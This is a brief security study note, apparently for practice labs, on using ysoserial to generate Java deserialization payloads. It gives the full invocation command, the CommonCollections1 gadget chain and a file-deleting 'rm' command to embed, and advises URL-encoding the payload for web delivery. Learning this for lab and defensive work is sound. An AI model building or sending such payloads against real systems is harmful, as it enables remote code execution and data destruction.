---
tags:
  - security
---
A tool for generating java [[Serialization|Deserialization]] payloads for [[Property Oriented Programming|POP]]
```
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   --add-opens=java.base/java.util=ALL-UNNAMED \
   -jar ysoserial-all.jar <payload> <command>
```
Common payloads:
- `CommonCollections1`
Common commands:
- `rm /home/carlos/morale.txt`
Remember to URL encode if you are sending this over the web.